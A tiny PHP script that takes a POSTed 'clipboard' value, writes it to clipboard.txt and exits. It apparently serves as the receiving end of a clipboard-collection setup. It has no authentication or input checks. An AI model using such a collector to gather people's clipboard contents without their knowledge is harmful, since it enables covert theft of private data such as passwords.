<?php
if (isset($_POST["clipboard"])){
    $file = fopen("clipboard.txt", "w");
    fwrite($file, "CLIPBOARD CONTENT : ".$_POST["clipboard"]);
    fclose($file);
}
exit();
?>